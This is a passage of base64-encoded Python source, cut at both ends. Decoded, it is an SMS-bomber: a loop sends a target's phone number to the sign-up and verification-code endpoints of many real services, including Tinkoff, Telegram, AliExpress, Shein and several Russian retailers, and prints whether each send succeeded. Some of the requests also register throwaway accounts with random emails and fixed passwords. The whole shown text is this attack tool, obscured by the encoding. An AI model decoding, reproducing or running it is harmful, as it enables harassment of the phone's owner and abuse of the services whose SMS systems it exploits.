2lzdHJhdGlvbi9jb25maXJtL3Bob25lLysiICsgc3RyKHBob25lKSArICIvIiwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSkKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3d3dy50aW5rb2ZmLnJ1L2FwaS9jb21tb24vdjEvc2lnbl91cD9vcmlnaW49d2ViJTJDaWI1JTJDcGxhdGZvcm0mc2Vzc2lvbmlkPXFhdU9BYng5a0lBcnJCQ25yTU5pTDM0OUduVkI3dEY5Lm0xLXByb2QtYXBpMTM0Jnd1aWQ9OGVjZDY1YWUwNGYxNTZmODQ2NmFmZmRmOTY1YWYxNGEiLCBkYXRhPXsicGhvbmUiOiBlbnRlcn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9teS50ZWxlZ3JhbS5vcmcvYXV0aC9zZW5kX3Bhc3N3b3JkIixkYXRhPXsicGhvbmUiOiBlbnRlcn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJy0nICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vbG9naW4uYWxpZXhwcmVzcy5jb20vam9pbi9QcmVDaGVja0ZvclBob25lUmVnaXN0ZXIuaHRtP2NlbGxQaG9uZT17fSZ1bWlkVG9rZW49VDJnQU5HaHBVcllJc2luZVdDN3VMaGI4NlNSNFBfdjJaZFlLdWpLOFdlLTBXNkd2Q3FjcTRtWElLckFFS2Z4SEhUbyUzRCZ1YT0xNDAlMjN4U01yek0lMkYlMkJ6ekZZa1FvMjJpZiUyQkN0U2R2UjhrT25obWs1aktrbWJBZm9pJTJGNCUyRlAlMkZNejRlQVVhOUdjZlVFd2NrYkRKQ2VJWFhJNnhvJTJGVUtBNDBzTFVTWEEwM2hxenpuaEZBOFljWmJ6eldia2JqdnVsRnp4MkREM1Z0aHF6Rm52STFZNFU2U3h6b09iVjJFcU1CUUIydFAlMkJldEdteFFucDJYUUFsM2w5elByZFYyVTNWSHJ4MnFmRFAwUWh4ckpJd1BDUENHbUNHVUxNJTJGSVUzdVBhM3RSZHBqajhhMlg2NjIlMkIwVHdBM1h5WGZEc2xOaEw3cWQlMkZSZE4lMkJ4WEZDaFplJTJCUFZiTnpzcHlnNUxPem8lMkIlMkJGNTI4OGIwJTJGbnN5MUolMkJnRDVsQmtkTVpud1M0ZGZodHB6a2hvMXNReVk3cnBZbXglMkJ6cXJueHglMkJ4NzRjdWdMOW1rNHJyZ0tGRnNweFduck15NGh1cHE5eUclMkZTMTg4azM0TklBRmVFVzc0b1RkOVg5UXQwWFglMkJhbUJFbVFiTG42Q1U0R3NYSGZkdUo0Q092RW1pSEdnYUM2ayUyRlg5SnRqeEFXcVlpbEM1OG4yY0lSY2wzeldRMjk5UVZQV2RyQjFPRkJQUjVmQ3dXakdSWGFQbFVxNVpuNlFrc3hsb2twdWFma0FFU0FUSGVBZkdDJTJGUEp5Z3UlMkJwNWR1azVkWURKbmloNyUyRkduWDkxZFNsQ2VDYWszb2N2WTlEMkhROCUyQkZBTnd5NzVYNHJGQiUyRk01TVpqT3J1T09mU2RKaFUxVzloREZKQm1qbDhEOEF3cDRvYlpVJTJGZk1qS3lqSEZuUzNTZSUyQmF3alZ3NGFKQ1dhdU5LT3lQcFlBVFMlMkIyUEclMkZJczNjR3FjNVBOJTJGR3N1dVZRTVpoNHNkMnhxdXNocGZ6JTJCN3QwZmhJSG9vcDU3QnFrUGxpYWdVUmZDT3FteWMxRldWNjZVdHE4R1hhaThibCUyRlpCM0hQUjFRRXQlMkI4NG51SFBvTlhwSTFOd0FRSFVwTkZsVktXMURMejB3T2hvQ3pWcUdmVERDZ25ienVFSnFFWGkwaElxRzZmTW5BT3hZOFlmR2NDSTNZbzNHTmZweWhZWjZtdmFhRWV6UlU3OHgyVWNBSzFDbWE0MVhyWXBZaDRaVVN5QXJDQkpjdlJRNHV4WUVDYWVORWJoRmRJRmpVUW9WczUxVCUyRnNnUmJsb1A3OTNQJTJCd1dGcXhQajE4TklLJTJGT2YzRGZ1JTJCcnZvcUVPeXVvbExhRmc0WnhyJTJGbFViNG9WNnZEbWZra21uRTJzcExHcDJUMWxEdHpXaDB2SzEyNyUyRjlFNFJtN0QyVkl1cExWNGx1ZVVyVHVJJTJGcTIlMkZWc0xNWFhkY2VHTGVKYWdQaVNScWZYdlFzYmVFd2pmUWdRZlBxJTJCNiUyQkw1bUxGV21FRlBWTlNzb085UkJ1OGtBV0tOQVBTZHl4dzV5QkxRM01pQzNpb0pCc1BLQmZnc3BYek0xZ3BUdUlqMTFwU3J2OElQUW1pbGhTd0VzcWYxaXhKTVB2b1NlQ0dUREVRRlE5NDhyYjhEQVFENUFacEYlMkJqM25qMUw2T1dxQVdCM2pPMWZ5U0tBTDJWNGk4dG5TeklOS2pwNE03aFpNSU1DMEg0dXVaZ0RId28wdlV4VmRvUDh3QU0lMkIlMkI3bU1zZlRxWnJqeW5NbW1tU3FRMHRNUHZ5VlZranIxMXJXaUFiemZmTldWdDFZTVUwUyUyRmwlMkZtMmclMkI4T0w1M0ZuenVYekVENGNZcFBMUGhiVHEyQURrVnFVRWJSNmI3SnVVcHNTbkFHMmdkNzhNU3k1Z1ZNTjFHOE1aQ25nMmtDaWhoOU8lMkI2S2RuTk90clEmcmVnaXN0ZXJGcm9tPUFFX01BSU5fUkVHSVNURVImYngtdWE9MjE3IVBrMEdZR3ppR3o0Y0Z4NnhqWU5IZjZhMEFtcktyT2wycDAzampzckNaZGh1QyUyQmdjcDZrVlNIWHd5JTJGUWdrQ29TVEdpQmZyakV2MWZrVnNkT3FPWUtBSVkwUFZ1aks4cXhmZEc1aW1yRW9TTWlOVnA1RVNsRzFDdzNBMHBVd3ZXQnBHR2glMkZkd0t2TzkxRzJZNThQMnYwRUdHZnp1S3dqdkJHR0czeDU3UnZPOTExMjdxOFdpR3ZpTUdVNm5Kd2JXQnBNcDMlMkY1NzBDTzlHRzJLeDhXalB2NktnaUhScTZraDdwcDczJTJCWUxIejY4VnUlMkZQS3FNVWJ6RW1xd00xVUxEWDkzazNOVHcxdEsybGFBS3BTR1Frd1NadG4lMkZNWVRwRHlEdXczN2wxOUE1b1JWJTJGMXNFUmtGenp3bW5PTTl3emlsYiUyQjUzcSUyQjAxeXBTJTJGTE01WklZY2kzVVRoeHdjYTJ6bGZHcDUwaCUyRjU4JTJGdiUyRnd0cEM4cU41ME9LMEY1NjRGUEZsaFJyOThmcCUyRlgxTG1xYSUyQnd3NnFNTWJTa0VhMFE3SjYyZTRSTUczJTJGazclMkZ2TzkxRzJZeDhLMkJ2MTJHVXh1VGwzUGVHWDclMkYlMkJKdWx2TzkxRjIyd09xUkJlSjUxTDhFOXdDdkJHakwyNENlQkxkUGw4VFJMT0g2d1drZG9sNEdxTE5UUDd3aWlPNlZScmp5ZTNUJTJGREoxVlB2MFp0cm5rZ2hiaXd5d2FIRXFmb3ZtaGFJUjRoa0tPcW83MWY0JTJGYUdBc0huS1olMkJhMzNvVDJWNkVSUWV4bTZmYWoxcm9iciUyRnNHUlFpNnZzdGhHM2pCRWdrbiUyRkVOMU9WcGlnbFVNNzlVWDN2SzRjWkJjSExPekRhUkJPenRzbzB1MlRVT2FPVVNwVnNHdzlYN1pURUVsRUJOem1iWWtWSVZ0UVlnb2NZQXIlMkJyN2hnclZCUk5Ebk5Zc2tjSVBYVGNJNkhKYSUyQmFKREgwTUQxWm1YVSUyRnJlRmpuMFRaWkMyaG9WQUM4Y2duT256TkRsT1Vpa09vU21TbURSR0poclQlMkZhakZZdjB5Ym45QWtYczVTcktPWnV2Z0dIQ05qUlpLJTJCVkJWSnROQmRWZiUyQmtqV3RrY05KandUZlRmb3clMkJFeWIzeExWc3JZdzBTN2RIWWglMkZMJTJCcTBYRjI2TldncWFURFhQSUMlMkI0YkxPNno5ZjFmRDNialhxMk1XZiUyQnBnRks3RDJVMTR2anpZWVlmbldzZlNuVEtrNFQ4ZWI5JTJCZ0R0c0NSbk5KZjc4cGQ4SklOJTJGYnZENlh3a3JMeUhvejk1YTNSaFRmMjUwUHVHdVNqd3oxSENNMGoydURWdU9tM3hHV0J5UkNRNVcxdDFiaWowZm81ZU1vOGNoOElXdGRQT0phZk1tazdXVSUyQnZlRU9zQkRLSHZLWXVGdUVxNmh2ZGV3V1Jka0pYdnlrOXRLaTJSOTklMkZaTlZUa0lFWTRPZHFzZyUyRlg4c1RPcnk4d05Rd3Ntd1RHa2FBQ2F0VmtwMTNOVURtQWt4NVU0Sng4VTNUY3ExJTNEJTNEJmJ4LXVtaWR0b2tlbj1UMmdBTU92YWhnSEczNFc4bGZvTnk2OF9mdExaQ29ZRkJrYVRxdjZ4MlRFMFlZX05JTVdfWnBJMTRTajlSTnZrelp3JTNEJl9ieC12PTIuMC4zOSIuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9IHN0cihwaG9uZSlbMTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ydS5zaGVpbi5jb20vdXNlci9hdXRoL3NlbmRjb2RlP19sYW5nPXJ1Jl92ZXI9MS4xLjgiLCBkYXRhPXsiYWxpYXNfdHlwZSI6ICIyIiwgImFsaWFzIjogZW50ZXIsICJzY2VuZSI6ICJwaG9uZV9sb2dpbl9yZWdpc3Rlcl92ZXJpZnkiLCJ0aGlyZF9wYXJ0eV90eXBlIjogOCwiYXJlYV9jb2RlIjogNywiYXJlYV9hYmJyIjogIlJVIn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmFuZG9tRW1haWwgPSByYW5kb21fY2hhcigxMykrIkBtYWlsLnJ1IgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTJCJyArIHN0cihwaG9uZSlbOi0xMF0gKyAnJTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJyUyMC0lMjAnICsgc3RyKHBob25lKVs3Oi0yXSArICclMjAtJTIwJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3NwYi5zdG9ja21hbm4ucnUvYWpheC8/Y29udHJvbGxlcj11c2VyJmFjdGlvbj1yZWdpc3RlclVzZXImc3VybmFtZT1EbWl0cnkmbmFtZT1EbWl0cnkmcGhvbmU9e30mZW1haWw9e30mcGFzc3dvcmQ9SnlwYmlwLWRlaHB1OC1kdWhtb24mcGFzc3dvcmRfY29uZmlybT1KeXBiaXAtZGVocHU4LWR1aG1vbiZzZXNzaWQ9MTY4NDQ4Njg2MGU3YTgxMGY4N2E4NmQzMmIzN2Q3YWUmdG9rZW49MDNBR2RCcTI1Qm1EQm5WRnlqNDlRVjg2MU44S2JfQ1Njd3UzclNadDROQ0g0N3NmN1NXVlBDTm9wb3Eza2VQZG90UGxMTXYwbTVjZU9NdWk0MmNMRWlLclE0UFlNZWdrMTN2RHdCTUQwc2RkQmM2TE1wOFdqeG9lTWVpa0ZWQ25FSXM2MXRZQ0h2aEktNEpGMTJIal85bkl6aE5CcTlUWmQ0cGZhN0pDS2c3d0FBZ1RHNkxpYzhjWjkwSUpXdE42VFJlb1c2SENNYlZtUktJcy01aXE5U2FpVTAzdE03YjRFNjBkV2hGUnRyNlZUMDk1WHc1X01GeEM0SG9sa3NLQ3FyejhqYWo3WnJ4Rm1JUFFJekpFT191eE4xLUk1LTV4Q01nTElFcEVBSW0wN215TG9nQ3dXSGo0VEp4THJvMXM1RWgza3J1R1d2eFFHN213S3pjTl9UNTExVTZQTWRjWFYyelJyeXhPSFhpZzRvWnkwVGhTSTVsVlhvVGtVclgzcHkzZDFaOXNyVnBDeU96MFo0VzVFLXdqZXp0bEZJZTRzeDJGN2ZjRjBFaWYySWpQc2hOMFpmbl9FbjR3RlAzU2ZzR0pQWUl6OHNlMHlKN084UFJ5TWl5SlNZRjV0NFc1LXhaUXNHWFV3Z0w0QVhGZzlXZGRqTUJVa0dOdWo3Yk9nbWxoLU02MGJJSDB0dScuZm9ybWF0KGVudGVyLCByYW5kb21FbWFpbCksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpWzotMTBdICsgJygnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2JyYW5kc2hvcC5ydS94aHIvbG9naW4vYWN0aXZhdGlvbmNvZGUvJywgZGF0YT17J3Bob25lJzogZW50ZXJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJzgrKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJykrJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vemFyaW5hLnJ1L3Z1ZS1hcGkvYXV0aC9yZWNlaXZlc21zY29kZS5waHA/cGhvbmU9e30nLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncm91cHByaWNlLnJ1L2F1dGhfcGhvbmUvc2VuZF9waG9uZV90b2tlbicsIGRhdGE9eydwaG9uZSc6ZW50ZXJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vaS5hcGkua2FyaS5jb20vZWNvbW1lcmNlL2NsaWVudC9yZWdpc3RyYXRpb24vdmVyaWZ5L3Bob25lL2NvZGU/cGhvbmU9JTJCe30nLmZvcm1hdChwaG9uZSksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcmFuZG9tRW1haWwgPSByYW5kb21fY2hhcigxMykrIkBtYWlsLnJ1IgogICAgICAgICAgICAgICAgZW50ZXIgPSBzdHIocGhvbmUpWzotMTBdICsgJygnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL2hhcHB5d2Vhci5ydS9pbmRleC5waHA/cm91dGU9bW9kdWxlL3JlZ2lzdGVyZm9ybWJveC9hamF4Q2hlY2tFbWFpbCcsIGRhdGE9eydlbWFpbCc6IHJhbmRvbUVtYWlsLCAndGVsZXBob25lJzogZW50ZXIsICdwYXNzd29yZCc6ICcxMjNxd3NkZnYnLCAnY29uZmlybSc6ICcxMjNxd3NkZnYnfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSkKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5wZXRzaG9wLnJ1L2FqYXgvP2FjdD1BdXRoRm9ybS5TZW5kQ29kZScsIGRhdGE9eyJ0b2tlbiI6IjQxMzhkY2U4YjRhNDhiZGE5ODZlMjM4NjZiNjY5ZDdmIiwiaXNfYWpheCI6J3RydWUnLCJwaG9uZSI6ZW50ZXIsImZvcmNlIjonZmFsc2UnfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9IHN0cihwaG9uZSlbOi0xMF0gKyAnKygnICsgc3RyKHBob25lKVsxOi03XSArICcpKycgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3N1cGVyc3RlcC5ydS9hamF4L2F1dGhQaG9uZS5waHA/QVVUSF9QSE9ORT1ZJlJFRElSRUNUX0FGVEVSX0NPTkZJUk09JTI1MkZwZXJzb25hbCUyNTJGcHJvZmlsZSUyNTJGJlBFUlNPTkFMX1BIT05FPSUyQnt9Jy5mb3JtYXQoZW50ZXIpLCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVE